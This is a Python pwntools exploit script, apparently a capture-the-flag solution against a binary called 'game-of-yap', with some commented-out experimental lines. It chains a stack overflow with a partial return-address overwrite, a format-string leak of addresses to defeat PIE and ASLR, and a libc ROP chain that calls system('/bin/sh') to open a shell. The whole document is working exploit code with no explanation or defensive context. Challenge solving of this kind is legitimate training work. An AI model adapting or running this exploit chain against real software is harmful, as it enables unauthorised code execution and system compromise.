from pwn import *
exe = context.binary = ELF("./game-of-yap")
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
r = process()
sleep(3)
rop = ROP(exe)
rop.raw(b"A" * 264)
rop.raw(b"\x80\x52")
sleep(3)
r.send(rop.chain())
r.recvuntil(b"Can you yap?\nHere's your first chance...\n")
leak_yap = int(r.recvline().strip().decode(),16)
exe.address = leak_yap - 0x1210
log.info(f"{hex(exe.address)}")
rop2 = ROP(exe)
# rop2.raw(exe.got['puts'])
rop2.raw("%27$p|\x00\x00")
rop2.raw(b"B" * 256)
# rop2.raw(exe.bss() + 0x100)
rsi_rdi = exe.address + 0x0000000000001243
rop2.raw(rsi_rdi)
# rop2.raw(exe.plt['puts'])
rop2.raw(exe.plt['printf'])
rop2.raw(exe.sym['yap'] + 8)
rop2.raw(0x555555558f9c - 0xc)
rop2.raw(exe.sym['play'] + 15)
sleep(3)
# rop2.raw(exe.sym['play'] + 15)
# rop2.raw(exe.sym['play'] + 15)
# rop2.raw(exe.sym['play'] + 15)
# rop2.raw(exe.sym['play'] + 15)
# rop2.raw(b"C" * 0x77)
r.send(rop2.chain())
# rop3 = ROP(exe)
# rop3.raw(b"A" * 264)
# rop3.raw(exe.bss() + 0x100)
# r.send(rop3.chain())
log.info(f"TES => {r.recv(9999)}")
addr = r.recv(9999).strip().decode().split('|')
print(addr)
libc.address = int(addr[0],16) - 0x29e25
log.info(f"LIBC BASE => {hex(libc.address)}")
rop3 = ROP(libc)
rop3.raw(b"C" * 264)
# pop_rsp = rop3.find_gadget(['pop rsp','ret'])[0]
# rop3.raw(pop_rsp)
# rop3.raw(0x555555558f9c)
pop_rdi = rop3.find_gadget(['pop rdi','ret'])[0]
rop3.raw(pop_rdi)
bin_sh = next(libc.search(b"/bin/sh\x00"))
rop3.raw(bin_sh)
ret = rop3.find_gadget(['ret'])[0]
rop3.raw(ret)
rop3.raw(libc.sym['system'])
r.send(rop3.chain())
r.interactive()